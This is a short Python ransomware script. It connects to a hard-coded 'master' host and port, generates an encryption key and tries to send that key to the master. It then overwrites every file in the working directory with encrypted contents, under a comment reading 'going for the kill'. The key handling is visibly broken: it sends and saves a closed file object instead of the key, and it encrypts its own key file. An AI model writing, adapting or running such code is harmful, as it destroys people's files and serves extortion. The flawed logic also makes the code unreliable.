import os
from cryptography.fernet import Fernet
import socket
import argparse


MASTER = "192.168.56.1"
PORT = 6969
ADDR = (MASTER, PORT)
FORMAT = "utf-8"
HEADER = 64
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)
files = []

for file in os.listdir():
    files.append(file)

#manufacturing encryption key, saving encryption key, sending it to master before finally encrypting
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
def send(msg):
    message = msg
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)
    
    
send(thekey)
open("backup.txt", "w").write(str(thekey)) 

#finally...going for the kill
#Fernet(key).encrypt(open(filepath))
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
